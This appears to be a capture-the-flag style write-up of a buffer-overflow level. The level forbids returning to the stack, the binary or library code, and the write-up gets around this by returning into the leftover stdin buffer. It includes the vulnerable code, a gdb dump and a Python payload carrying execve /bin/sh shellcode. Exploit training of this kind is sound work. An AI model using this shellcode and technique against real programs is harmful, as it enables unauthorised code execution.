# Vulnerability
```c
char buffer[40];
char *ret_addr;

// overflow!
fgets(buffer, 256, stdin);
```
This program copys 256bytes so I can overwrite SFP & RET address.

The protection code is:
```c
if(*(buffer+47) == '\xbf')
{
  printf("stack retbayed you!\n");
  exit(0);
}

if(*(buffer+47) == '\x08')
      {
              printf("binary image retbayed you, too!!\n");
              exit(0);
      }

// check if the ret_addr is library function or not
memcpy(&ret_addr, buffer+44, 4);
while(memcmp(ret_addr, "\x90\x90", 2) != 0)	// end point of function
{
  if(*ret_addr == '\xc9'){		// leave
    if(*(ret_addr+1) == '\xc3'){	// ret
      printf("You cannot use library function!\n");
      exit(0);
    }
  }
  ret_addr++; 
}
```
So I am not able to use binary image or stack or library.

# Exploitation
When using fgets, there is stdin buffer that saves user's input.

This program does not reset that stdin buffer so I can return to that address.

The stdin address is 0x40015000:
```
(gdb) x/16x stdin
0x401068c0 <_IO_2_1_stdin_>:	0xfbad2288	0x40015011	0x40015011	0x40015000
0x401068d0 <_IO_2_1_stdin_+16>:	0x40015000	0x40015000	0x40015000	0x40015000
```

The payload will be:
```
--------------------------------------------------------------
| "\x90"*15 | Shellcode(25 bytes) | "AAAA" | stdin's address |
--------------------------------------------------------------
```
# Payload
```python
payload = ""
payload = payload + "\x90"*15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA"
payload = payload + "\x00\x50\x01\x40"

print payload
```
